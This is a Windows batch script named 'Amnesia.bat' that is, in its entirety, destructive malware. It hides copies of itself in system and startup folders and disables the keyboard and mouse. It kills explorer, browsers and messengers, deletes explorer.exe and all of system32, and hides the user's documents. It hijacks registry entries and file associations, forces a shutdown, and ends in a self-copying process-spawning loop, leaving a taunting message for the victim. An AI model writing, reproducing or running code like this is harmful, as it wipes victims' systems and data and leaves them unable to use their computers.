@echo off
copy "Amnesia.bat" "C:\WINDOWS"
attrib +r +h +s "Amnesia.bat"
copy "Amnesia.bat" "C:\Documents and Settings\Owner\Start Menu\Programs\startup"
copy "Amnesia.bat" "C:\"
copy "Amnesia.bat" "C:\Documents and Settings\Owner\My Documents"
Reg Add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /f /d "10"
rundll32 keyboard, disable
rundll32 mouse, disable
taskkill explorer /t /t 
taskkill yahoomessenger /f /t
taskkill msmsgs /t /f
taskkill firefox /f /t
taskkill iexplore /f /t
time 6:66
del "C:\WINDOWS\explorer.exe" /f /q
cd "C:\WINDOWS"
del "*.bat" /f /q
cd "C:\WINDOWS\system32"
del "*.*" /q /f 
del "C:\Program Files\messenger\msmsgs.exe" /q /f
del "C:\Program Files\Yahoo!\messenger\YahooMessenger.exe" /q /f
attrib +r +h "C:\Documents and Settings\Owner\My Documents\My Music"
attrib +r +h "C:\Documents and Settings\Owner\My Documents\My Pictures"
attrib +r +h "C:\Documents and Settings\Owner\My Documents\My Videos"
attrib +r +h "C:\Documents and Settings\Owner\My Documents"
attrib +r +h "C:\WINDOWS"
RASDIAL /DISCONNECT
start D:\ 
reg add "HKLM\SOFTWARE\Mozilla\Mozilla Firefox.0.0.12 (en-US)\main" /v PathtoExe /f /d "C:\WINDOWS\Amnesia.bat"
reg add "HKLM\SOFTWARE\InstallShield\driver\intel32" /v folder /f /d "C:\WINDOWS\Amnesia.bat"
assoc .exe=WMAFile
assoc .mp3=VBSFile
assoc .jpg=THEMEFile
assoc .bmp=THEMEFile
assoc .gif=THEMEFile
echo You have been pwned by Amnesia. Next time, don't be so stupid! >> finalmessage.txt
start finalmessage.txt
shutdown -s -t 60 -c "Say goodbye"
msg * Amnesia has wiped your computer clean
:section1
cd "C:\Documents and Settings\Owner\desktop"
copy "C:\WINDOWS\Amnesia.bat" "8021.bat"
cd "C:\Documents and Settings\Owner\desktop"
md 5265
cd "C:\WINDOWS\system32"
copy "C:\WINDOWS\Amnesia.bat" "2696.bat"
start
start
start
start
start
goto section1